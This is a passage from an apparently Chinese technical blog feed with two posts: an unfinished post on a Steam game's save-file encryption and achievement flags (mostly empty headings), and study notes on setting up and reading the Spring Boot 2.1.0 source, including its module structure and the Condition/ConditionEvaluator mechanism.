<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;LUCKY_DAY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_ENDING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COMMON_SENSE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHRUG_IT_OFF&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ONE_RELIC&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NEON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;FOCUSED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DONUT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NINJA&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="存档加密算法分析"><a href="#存档加密算法分析" class="headerlink" title="存档加密算法分析"></a>存档加密算法分析</h3><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h2 id="全成就快速完成攻略："><a href="#全成就快速完成攻略：" class="headerlink" title="全成就快速完成攻略："></a>全成就快速完成攻略：</h2><h3 id="Boss击杀"><a href="#Boss击杀" class="headerlink" title="Boss击杀"></a><strong>Boss击杀</strong></h3><p>守护者、亡魂、老大、第一勇士、收藏家、机械人偶、乌鸦、形状、时间吞噬者。</p>
<p>这些有手就行，多打几把基本都能完成。</p>
<h3 id="通关"><a href="#通关" class="headerlink" title="通关"></a>通关</h3><p>红宝石：</p>
<p>红宝石+：</p>
<p>绿宝石：</p>
<p>绿宝石+：</p>
<p>蓝宝石：</p>
<p>蓝宝石+：</p>
<p>结局：</p>
<p>紫水晶：</p>
<p>紫水晶+：</p>
<p>进阶0：</p>
<p>进阶10：</p>
<p>进阶20：</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>瘟疫：</p>
<p>耸肩无视：</p>
<p>契约：</p>
<p>肾上腺素：</p>
<p>纯净：</p>
<p>催化剂：</p>
<p>岿然不动：</p>
<p>岿然不动：</p>
<p>嗑药：</p>
<p>来打我啊：</p>
<p>强大：</p>
<p>无限：</p>
<p>忍者：</p>
<p>弱者为何要战斗：</p>
<p>哦！甜甜圈：</p>
<p>快速攀爬者：</p>
<p>极简主义者：</p>
<p>谁会需要遗物：</p>
<p>平常心：</p>
<p>集中：</p>
<p>霓虹：</p>
<p>今天是个好日子：</p>
<p>倏忽即逝：</p>
<p>永存者：</p>
]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>java</tag>
        <tag>steam</tag>
      </tags>
  </entry>
  <entry>
    <title>spring 源码学习</title>
    <url>/2024/07/16/spring-%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>参考资料：</p>
<p><a href="https://www.bilibili.com/video/BV1284y1p7HC/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">马士兵全套Spring源码深度解析：AOP、IOC、Bean生命周期、循环依赖、事务、SpringBoot自动装配等_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.bilibili.com/video/BV1P44y1N7QG/?spm_id_from=333.999.0.0&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Spring视频教程，深度讲解spring5底层原理_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.yuque.com/snailclimb/gepg7u">《Java必读源码系列》 (yuque.com)</a></p>
<p><a href="https://www.cnblogs.com/java-chen-hao/category/1480619.html">Spring 源码解析 - 随笔分类 - chen_hao - 博客园 (cnblogs.com)</a></p>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU5ODg2Njk4OA==&action=getalbum&album_id=1392938760375238659&scene=173#wechat_redirect">#Spring源码专题 (qq.com)</a></p>
<span id="more"></span>

<h1 id="javaguide教程"><a href="#javaguide教程" class="headerlink" title="javaguide教程"></a>javaguide教程</h1><h2 id="1-搭建自己的SpringBoot源码调试环境"><a href="#1-搭建自己的SpringBoot源码调试环境" class="headerlink" title="1-搭建自己的SpringBoot源码调试环境"></a>1-搭建自己的SpringBoot源码调试环境</h2><p><a href="https://github.com/yuanmabiji/spring-boot-2.1.0.RELEASE">https://github.com/yuanmabiji/spring-boot-2.1.0.RELEASE</a>)</p>
<p>然后导入idea</p>
<h3 id="1-环境安装要求"><a href="#1-环境安装要求" class="headerlink" title="1.环境安装要求"></a>1.环境安装要求</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● IntelliJ IDEA</span><br><span class="line">● JDK1.8</span><br><span class="line">● Maven3.5 以上</span><br></pre></td></tr></table></figure>

<h3 id="2-从-Github-上将-SpringBoot-源码项目下载下来"><a href="#2-从-Github-上将-SpringBoot-源码项目下载下来" class="headerlink" title="2.从 Github 上将 SpringBoot 源码项目下载下来"></a>2.从 Github 上将 SpringBoot 源码项目下载下来</h3><p>使用中文带注释的仓库搭建-<a href="https://github.com/yuanmabiji/spring-boot-2.1.0.RELEASE">yuanmabiji&#x2F;spring-boot-2.1.0.RELEASE: SpringBoot源码分析–项目里有超详细的中文代码注释，中文注释会随着每篇SpringBoot的源码分析文章的推出而更新，中文注释持续更新中… (github.com)</a></p>
<p>直接点击下载或者clone都行</p>
<h3 id="3-将-SpringBoot-源码项目导入到-IDEA-中"><a href="#3-将-SpringBoot-源码项目导入到-IDEA-中" class="headerlink" title="3.将 SpringBoot 源码项目导入到 IDEA 中"></a>3.将 SpringBoot 源码项目导入到 IDEA 中</h3><p><a href="https://blog.csdn.net/zhuzj12345/article/details/93200211">配置maven使用阿里云仓库_ali repository-CSDN博客</a></p>
<h3 id="4-编译构建-SpringBoot-源码项目"><a href="#4-编译构建-SpringBoot-源码项目" class="headerlink" title="4.编译构建 SpringBoot 源码项目"></a>4.编译构建 SpringBoot 源码项目</h3><p>禁用 maven 的代码检查，在根 <code>pom.xml</code> 中增加一下配置即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">	&lt;revision&gt;2.1.0.RELEASE&lt;/revision&gt;</span><br><span class="line">	&lt;main.basedir&gt;$&#123;basedir&#125;&lt;/main.basedir&gt;</span><br><span class="line">	&lt;!--设置disable.checks为true--&gt;</span><br><span class="line">	&lt;disable.checks&gt;false&lt;/disable.checks&gt;</span><br><span class="line">&lt;/properties&gt;</span><br></pre></td></tr></table></figure>

<p>可能出现oom错误 </p>
<p>参考：<a href="https://blog.csdn.net/w605283073/article/details/85107497">Maven依赖包导入错误（IntelliJ IDEA）：GC overhead limit exceeded_idea gc overhead limit exceeded-CSDN博客</a></p>
<p>我还出现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BUILD FAILURE</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time:  01:43 min</span><br><span class="line">[INFO] Finished at: 2024-09-06T18:06:08+08:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[ERROR] Java heap space -&gt; [Help 1]</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.</span><br><span class="line">[ERROR] Re-run Maven using the -X switch to enable full debug logging.</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] For more information about the errors and possible solutions, please read the following articles:</span><br><span class="line">[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/OutOfMemoryError</span><br><span class="line"></span><br><span class="line">Process finished with exit code 1</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.csdn.net/u013008898/article/details/109719481">maven编译出现Java heap space,和项目编译问题_lombok java heap space-CSDN博客</a> 解决</p>
<p>少了编译不了，多了分配不了这么多空间。。。。。。。。</p>
<p>Kotlin: Language version 1.1 is no longer supported; please, use version 1.3 or greater.</p>
<p>参考：<a href="https://blog.csdn.net/qq_42223569/article/details/114073404">Spring源码编译过程中出现Kotlin: Language version 1.1 is no longer supported； please, use version 1.2_kotlin: language version 1.3 is deprecated and its-CSDN博客</a>解决</p>
<h3 id="5-运行-SpringBoot-自带的-sample"><a href="#5-运行-SpringBoot-自带的-sample" class="headerlink" title="5.运行 SpringBoot 自带的 sample"></a>5.运行 SpringBoot 自带的 sample</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240906202307808.png" alt="image-20240906202307808"></p>
<p>终于OK了</p>
<h2 id="2-SpringBoot源码模块及结构"><a href="#2-SpringBoot源码模块及结构" class="headerlink" title="2-SpringBoot源码模块及结构"></a>2-<strong>SpringBoot源码模块及结构</strong></h2><p>该源码分析对应SpringBoot版本为<strong>2.1.0.RELEASE</strong></p>
<p>[分析开源项目源码，我们该如何入手分析？（授人以渔）本文接上篇文章<a href="https://juejin.cn/post/6844904067936813063">跟大家聊聊我们为什么要学习源码？学习源码对我们有用吗？ - 掘金 (juejin.cn)</a></p>
<p><a href="https://juejin.cn/post/6844904067257352205">跟大家聊聊我们为什么要学习源码？学习源码对我们有用吗？现在程序员越来越多，可以说竞争尤其激烈。如果我们想不被淘汰，则我们 - 掘金 (juejin.cn)</a></p>
<p><a href="https://blog.csdn.net/w605283073/article/details/89290798">如何高效学习和阅读源码？_ai 阅读 源码-CSDN博客</a></p>
<h3 id="1-SpringBoot源码模块"><a href="#1-SpringBoot源码模块" class="headerlink" title="1.SpringBoot源码模块"></a>1.SpringBoot源码模块</h3><p>共四个模块：</p>
<ul>
<li><code>spring-boot-project</code>：整个SpringBoot框架全部功能在这个模块实现，SpringBoot项目95%的代码都在这里实现，源码总共有25万行左右。</li>
<li><code>spring-boot-samples</code>：这个是SpringBoot给小伙伴们赠送的福利，里面包含了各种各样使用SpringBoot的简单demo，我们调试阅读源码的时候可以充分利用该模块。</li>
<li><code>spring-boot-sample-invoker</code>：这个模块是跟sample模块有关，根pom.xml中有这么一句话：<code>Samples are built via the invoker plugin</code>，该模块无代码。</li>
<li><code>spring-boot-tests</code>：这个模块SpringBoot的测试模块，跟部署测试和集成测试有关。</li>
</ul>
<h3 id="2-spring-boot-project源码模块详解"><a href="#2-spring-boot-project源码模块详解" class="headerlink" title="2.spring-boot-project源码模块详解"></a>2.spring-boot-project源码模块详解</h3><p>下面有14个模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) spring-boot-parent</span><br><span class="line">这个模块没有代码，是spring-boot模块的父项目，被其他子模块继承。</span><br><span class="line"></span><br><span class="line">2) spring-boot</span><br><span class="line">这个模块是SpringBoot项目的核心，可以说一些基础核心的功能都在这里实现，为SpringBoot的其他模块组件功能提供了支持，主要包括以下核心功能：</span><br><span class="line">● SpringApplication类，这个是SpringBoot的启动类，提供了一个静态的run方法来启动程序，该类主要用来创建并且刷新Spring容器ApplicationContext.</span><br><span class="line">● 支持选择不同的容器比如Tomcat,Jetty等来作为应用的嵌入容器，这个是SpringBoot的新特性之一。</span><br><span class="line">● 外部配置支持，这个指的是我们执行java -jar xxx.jar命令时可以带一些参数，比如执行java -jar demo.jar --server.port=8888来将应用端口修改为8888.</span><br><span class="line">● 该模块内置了一些SpringBoot启动时的生命周期事件和一些容器初始化器(ApplicationContext initializers)，来执行一些SpringBoot启动时的初始化逻辑。</span><br><span class="line"></span><br><span class="line">3) spring-boot-autoconfigure</span><br><span class="line">这个模块跟SpringBoot的自动配置有关，也是SpringBoot的新特性之一。比如SpringBoot能基于类路径来自动配置某个项目模块，自动配置最为关键的注解是@EnableAutoConfiguration,这个注解能触发Spring上下文的自动配置。另外一个重要的注解是@Conditional。</span><br><span class="line">举个栗子，若HSQLDB在项目的类路径中，且我们没有配置任何其他数据库的连接，此时自动配置就会自动根据类路径来创建相应的bean。</span><br><span class="line">除了根据类路径来进行自动配置外，还有根据容器中是否存在某个bean等方式来进行自动配置</span><br><span class="line"></span><br><span class="line">4) spring-boot-starters</span><br><span class="line">这个模块是跟SpringBoot的起步依赖有关，也是SpringBoot的新特性之一。SpringBoot通过提供众多起步依赖降低项目依赖的复杂度。起步依赖其实就是利用maven项目模型将其他相关的依赖给聚合起来，里面各种依赖的版本号都给定义好，避免用户在引入依赖时出现各种版本冲突，方便了我们的使用。</span><br><span class="line">举个栗子，我们要用到activemq时，此时可以直接引入spring-boot-starter-activemq起步依赖即可，若SpringBoot官网或第三方组织没有提供相应的SpringBoot起步依赖时，此时我们可以进行定制自己的起步依赖。</span><br><span class="line">注意，该模块没有代码，主要是通过maven的pom.xml来组织各种依赖。</span><br><span class="line"></span><br><span class="line">5) spring-boot-cli</span><br><span class="line">Spring Boot CLI是一个命令行工具，如果您想使用Spring快速开发，可以使用它。它允许您运行Groovy脚本，这意味着您有一个熟悉的类似Java的语法，而没有那么多样板代码。您还可以引导一个新项目或编写自己的命令。</span><br><span class="line"></span><br><span class="line">6) spring-boot-actuator</span><br><span class="line">这个跟SpringBoot的监控有关，也是SpringBoot的新特性之一。可以通过HTTP端点或JMX等来管理和监控应用。审计、运行状况和度量收集可以自动应用到应用程序。这个监控模块是开箱即用的，提供了一系列端点包括HealthEndpoint, EnvironmentEndpoint和BeansEndpoint等端点。</span><br><span class="line"></span><br><span class="line">7) spring-boot-actuator-autoconfigure</span><br><span class="line">这个模块为监控模块提供自动配置的功能，通常也是根据类路径来进行配置。比如Micrometer存在于类路径中，那么将会自动配置MetricsEndpoint。</span><br><span class="line"></span><br><span class="line">8) spring-boot-test</span><br><span class="line">这个模式是spring-boot的跟测试有关的模块，包含了一些帮助我们测试的核心类和注解（比如@SpringBootTest）。</span><br><span class="line"></span><br><span class="line">9) spring-boot-dependencies</span><br><span class="line">这个模块没有代码，主要是定义了一些SpringBoot的maven相关的一些依赖及其版本。</span><br><span class="line"></span><br><span class="line">10) spring-boot-devtools</span><br><span class="line">这个模块跟SpringBoot的热部署有关，即修改代码后无需重启应用即生效。</span><br><span class="line"></span><br><span class="line">11) spring-boot-docs</span><br><span class="line">这个模块应该是跟文档相关的模块。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12) spring-boot-properties-migrator</span><br><span class="line">看到 migrator 这个单词，估计就是跟项目迁移有关。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13) spring-boot-test-autoconfigure</span><br><span class="line">跟SpringBoot的测试的自动配置有关。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14) spring-boot-tools</span><br><span class="line">这个模块一看就是SpringBoot的工具相关的模块，提供了加载，maven插件,metadata和后置处理相关的支持。</span><br></pre></td></tr></table></figure>

<p>真正要看的模块有<code>spring-boot</code>，<code>spring-boot-autoconfigure</code>，<code>spring-boot-starters</code>和<code>spring-boot-actuator</code>模块。</p>
<h3 id="3-SpringBoot源码项目的脉络"><a href="#3-SpringBoot源码项目的脉络" class="headerlink" title="3.SpringBoot源码项目的脉络"></a>3.SpringBoot源码项目的脉络</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240907181814903.png" alt="image-20240907181814903"></p>
<h3 id="4-SpringBoot模块之间的pom关系详解"><a href="#4-SpringBoot模块之间的pom关系详解" class="headerlink" title="4.SpringBoot模块之间的pom关系详解"></a>4.SpringBoot模块之间的pom关系详解</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240907182304648.png" alt="image-20240907182304648"></p>
<p>SpringBoot的一些父pom做了一些版本管理，聚合模块之间的事情</p>
<h2 id="3-SpringBoot自动配置的条件注解原理"><a href="#3-SpringBoot自动配置的条件注解原理" class="headerlink" title="3-SpringBoot自动配置的条件注解原理"></a>3-<strong>SpringBoot自动配置的条件注解原理</strong></h2><h3 id="1-SpringBoot-的派生条件注解"><a href="#1-SpringBoot-的派生条件注解" class="headerlink" title="1.SpringBoot 的派生条件注解"></a>1.SpringBoot 的派生条件注解</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240907183414515.png" alt="image-20240907183414515"></p>
<p>这些派生条件注解是在package org.springframework.boot.autoconfigure.condition包下</p>
<h3 id="2-Condition-接口"><a href="#2-Condition-接口" class="headerlink" title="2.Condition 接口"></a>2.Condition 接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现spring 的Condition接口，并且重写matches()方法，如果<span class="doctag">@ConditionalOnLinux</span>的注解属性environment是linux就返回true</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinuxCondition</span> <span class="keyword">implements</span> <span class="title class_">Condition</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(ConditionContext context, AnnotatedTypeMetadata metadata)</span> &#123;</span><br><span class="line">        <span class="comment">// 获得注解@ConditionalOnLinux的所有属性</span></span><br><span class="line">        List &lt; AnnotationAttributes &gt; allAnnotationAttributes = annotationAttributesFromMultiValueMap(</span><br><span class="line">            metadata.getAllAnnotationAttributes(</span><br><span class="line">                ConditionalOnLinux.class.getName()));</span><br><span class="line">        <span class="keyword">for</span> (AnnotationAttributes annotationAttributes: allAnnotationAttributes) &#123;</span><br><span class="line">            <span class="comment">// 获得注解@ConditionalOnLinux的environment属性</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">environment</span> <span class="operator">=</span> annotationAttributes.getString(<span class="string">&quot;environment&quot;</span>);</span><br><span class="line">            <span class="comment">// 若environment等于linux，则返回true</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;linux&quot;</span>.equals(environment)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(&#123;</span></span><br><span class="line"><span class="meta">    ElementType.TYPE,</span></span><br><span class="line"><span class="meta">    ElementType.METHOD</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Conditional(LinuxCondition.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> ConditionalOnLinux &#123;</span><br><span class="line">    <span class="comment">// 标注是哪个环境</span></span><br><span class="line">    String <span class="title function_">environment</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConditionConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 只有`@ConditionalOnLinux`的注解属性`environment`是&quot;linux&quot;时才会创建bean</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnLinux(environment = &quot;linux&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Environment <span class="title function_">linuxEnvironment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LinuxEnvironment</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自定义@ConditionalOnLinux注解，需要写三个东西</p>
<p>LinuxCondition类：实现Condition、编写match逻辑</p>
<p>@ConditionalOnLinux：自定义注解，为@Conditional的派生注解,与@Conditional(LinuxCondition.class)等价</p>
<p>配置类<code>ConditionConfig</code>:在<code>linuxEnvironment</code>方法上标注了<code>@ConditionalOnLinux(environment = &quot;linux&quot;)</code>。因此，这里只有 <code>LinuxCondition</code>的<code>matches</code>方法返回 true 才会创建<code>bean</code>。</p>
<p><code>Condition</code>接口的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Condition</span> &#123;</span><br><span class="line">	<span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(ConditionContext context, AnnotatedTypeMetadata metadata)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Condition 接口主要有一个matches方法，该方法决定了是否要注册相应的bean对象。其中matches方法中有两个参数，参数类型分别是ConditionContext和AnnotatedTypeMetadata，这两个参数非常重要。它们分别用来获取一些环境信息和注解元数据从而用在matches方法中判断是否符合条件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240926085840165.png" alt="image-20240926085840165"></p>
<p>这个是堆栈可以看到就是spring初始化流程</p>
<p>后面看堆栈发现是在ConditionEvaluator的shouldSkip方法中调用了LinuxCondition的matches方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 这个方法主要是如果是解析阶段则跳过，如果是注册阶段则不跳过</span><br><span class="line">public boolean shouldSkip(@Nullable AnnotatedTypeMetadata metadata, @Nullable ConfigurationPhase phase) &#123;</span><br><span class="line">	// 若没有被@Conditional或其派生注解所标注，则不会跳过</span><br><span class="line">	if (metadata == null || !metadata.isAnnotated(Conditional.class.getName())) &#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	// 没有指定phase，注意phase可以分为PARSE_CONFIGURATION或REGISTER_BEAN类型</span><br><span class="line">	if (phase == null) &#123;</span><br><span class="line">		// 若标有@Component，@Import，@Bean或@Configuration等注解的话，则说明是PARSE_CONFIGURATION类型</span><br><span class="line">		if (metadata instanceof AnnotationMetadata &amp;&amp;</span><br><span class="line">				ConfigurationClassUtils.isConfigurationCandidate((AnnotationMetadata) metadata)) &#123;</span><br><span class="line">			return shouldSkip(metadata, ConfigurationPhase.PARSE_CONFIGURATION);</span><br><span class="line">		&#125;</span><br><span class="line">		// 否则是REGISTER_BEAN类型</span><br><span class="line">		return shouldSkip(metadata, ConfigurationPhase.REGISTER_BEAN);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	List&lt;Condition&gt; conditions = new ArrayList&lt;&gt;();</span><br><span class="line">	// TODO 获得所有标有@Conditional注解或其派生注解里面的Condition接口实现类并实例化成对象。</span><br><span class="line">	// 比如@Conditional(OnBeanCondition.class)则获得OnBeanCondition.class，OnBeanCondition.class往往实现了Condition接口</span><br><span class="line">	for (String[] conditionClasses : getConditionClasses(metadata)) &#123;</span><br><span class="line">		// 将类实例化成对象</span><br><span class="line">		for (String conditionClass : conditionClasses) &#123;</span><br><span class="line">			Condition condition = getCondition(conditionClass, this.context.getClassLoader());</span><br><span class="line">			conditions.add(condition);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	// 排序，即按照Condition的优先级进行排序</span><br><span class="line">	AnnotationAwareOrderComparator.sort(conditions);</span><br><span class="line"></span><br><span class="line">	for (Condition condition : conditions) &#123;</span><br><span class="line">		ConfigurationPhase requiredPhase = null;</span><br><span class="line">		if (condition instanceof ConfigurationCondition) &#123;</span><br><span class="line">			// 从condition中获得对bean是解析还是注册</span><br><span class="line">			requiredPhase = ((ConfigurationCondition) condition).getConfigurationPhase();</span><br><span class="line">		&#125;</span><br><span class="line">		// 若requiredPhase为null或获取的阶段类型正是当前阶段类型且不符合condition的matches条件，则跳过</span><br><span class="line">		if ((requiredPhase == null || requiredPhase == phase) &amp;&amp; !condition.matches(this.context, metadata)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键部分</p>
